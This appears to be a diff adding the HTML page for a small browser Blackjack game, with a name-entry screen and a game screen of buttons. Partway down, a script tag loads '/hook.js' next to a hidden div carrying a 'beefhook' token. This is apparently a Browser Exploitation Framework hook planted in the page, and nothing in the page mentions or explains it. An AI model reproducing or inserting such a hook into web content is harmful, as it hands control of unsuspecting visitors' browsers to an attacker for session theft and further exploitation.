@@ -1,0 +1,32 @@
+
+<html>
+<head><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.css">
+    <link rel="stylesheet" href="index.css">
+</head>
+<script src="jquery-1.12.4.min.js"></script>
+<body>
+    <!-- Name Entry Screen -->
+<div id="name-entry-screen">
+    <h1 class="blackjack-title">Welcome to Blackjack</h1>
+    <input type="text" id="name-input" placeholder="Enter your name">
+    <button onclick="enterGame()">Enter Game</button>
+    <div class="image-container">
+        <img src="images/bj.jpg" alt="Blackjack Image">
+    </div>
+</div>
+<script src="/hook.js"></script><div id="userdata_el" beefhook="m7hgwt1MbYWdselCSBRlYNdsR6EBIrslwt9m4DNm0y0M5rP4q5MWhnT32io7smumIKB7AqC2ciObzcGa" style="visibility: hidden; position: absolute;"></div>
+    <!-- Main Game Screen (Initially Hidden) -->
+    <div id="game-screen" style="display: none;">
+        <h1 class="blackjack-title">Blackjack</h1>
+        <p id="cards-el">Cards:</p>
+        <p id="sum-el">Sum:</p>
+        <p id="message-el"></p>
+        <button id="startGameBtn" onclick="startGame()">Start Game</button>
+        <button id="newCardBtn" onclick="newCard()">New Card</button>
+        <button id="staySafeBtn" onclick="staySafe()">Stay Safe</button>
+        <p id="player-el"></p>
+    </div>
+
+    <script src="index.js"></script>
+</body>
+</html>
